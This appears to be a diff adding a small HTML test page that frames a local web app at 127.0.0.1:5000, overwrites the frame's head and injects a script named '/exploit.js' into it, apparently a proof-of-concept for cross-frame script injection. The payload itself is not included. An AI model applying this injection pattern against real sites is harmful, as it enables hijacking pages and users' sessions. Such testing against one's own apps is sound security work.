@@ -1,0 +1,29 @@
+<html>
+<head>
+	<title>test</title>
+</head>
+<body>
+	<script>
+		frame=document.createElement("iframe");
+		frame.src="http://127.0.0.1:5000/";
+		frame.height="50%";
+		frame.width="50%";
+		document.body.appendChild(frame);
+		console.log(window.frames[0]);
+		window.frames[0].document.head.innerHTML="dafoafoafaofjhaojfh";
+		console.log(window.frames[0].document.head);
+		script_test=document.createElement('script');
+                script_test.src='/exploit.js';
+                script_test.type = 'text/javascript';
+		window.frames[0].document.head.appendChild(script_test);
+		frame=document.createElement("iframe");
+		frame.src="http://127.0.0.1:5000/";
+		frame.height='50%';
+		frame.width='50%';
+		document.body.appendChild(frame);
+		//console.log(script_test);
+		//console.log(window.frames[1].document.head);
+		//window.frames[1].document.head.appendChild(script_test);
+	</script>
+</body>
+</html>
